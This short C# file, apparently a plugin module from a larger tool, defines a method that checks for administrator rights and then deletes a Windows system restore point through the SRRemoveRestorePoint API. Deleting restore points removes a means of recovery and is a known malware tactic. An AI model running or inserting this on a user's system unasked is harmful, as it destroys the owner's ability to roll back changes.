
/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    internal class DeleteRestorePoint
    {
        internal static bool DeleteARestorePoint(int sequenceNumber) 
        {
            if (!Utils.IsAdmin())
                return false;

            uint result = Imports.SRRemoveRestorePoint(sequenceNumber);

            if(result == Imports.ERROR_SUCCESS)
                return true;
            else
                return false;
        }
    }
}
